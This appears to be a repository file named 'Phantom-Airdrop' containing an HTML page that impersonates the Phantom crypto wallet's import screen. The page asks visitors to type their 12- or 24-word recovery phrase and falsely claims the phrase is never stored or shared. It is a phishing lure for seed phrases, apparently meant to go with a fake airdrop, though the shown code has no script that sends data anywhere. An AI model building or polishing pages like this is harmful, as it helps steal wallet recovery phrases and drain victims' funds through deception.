# Phantom-Airdrop
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Phantom Wallet - Import</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
  body {
    margin: 0;
    background: linear-gradient(160deg, #1e004c, #2d0066);
    font-family: 'Inter', sans-serif;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    background: rgba(255 255 255 / 0.05);
    padding: 40px 30px;
    border-radius: 12px;
    width: 360px;
    box-shadow: 0 0 20px rgba(108, 92, 231, 0.6);
    text-align: center;
  }
  .logo {
    width: 60px;
    margin-bottom: 24px;
    filter: drop-shadow(0 0 2px rgba(255 255 255 / 0.7));
  }
  h1 {
    margin: 0 0 8px;
    font-weight: 700;
    font-size: 1.8rem;
  }
  p.subheading {
    margin: 0 0 24px;
    font-weight: 400;
    font-size: 1rem;
    color: #ccc;
  }
  textarea {
    width: 100%;
    height: 100px;
    border-radius: 8px;
    border: none;
    padding: 12px;
    font-size: 1rem;
    background: rgba(255 255 255 / 0.15);
    color: white;
    resize: none;
    box-sizing: border-box;
    outline-offset: 2px;
    outline-color: #6c5ce7;
  }
  textarea::placeholder {
    color: #d0c8ff;
  }
  button {
    margin-top: 24px;
    width: 100%;
    padding: 14px 0;
    background-color: #6c5ce7;
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 1.1rem;
    font-weight: 700;
    cursor: pointer;
    transition: filter 0.3s ease;
  }
  button:hover {
    filter: brightness(1.15);
  }
  .footer-note {
    margin-top: 16px;
    font-size: 0.8rem;
    color: #aaa;
  }
</style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://cdn.iconscout.com/icon/free/png-256/fox-198-433757.png" alt="Phantom Logo" />
    <h1>Import Wallet</h1>
    <p class="subheading">Securely access your existing wallet using your Secret Recovery Phrase.</p>
    <textarea placeholder="Enter your 12 or 24-word phrase..."></textarea>
    <button>Continue</button>
    <p class="footer-note">Your phrase is never stored or shared.</p>
  </div>
</body>
</html>

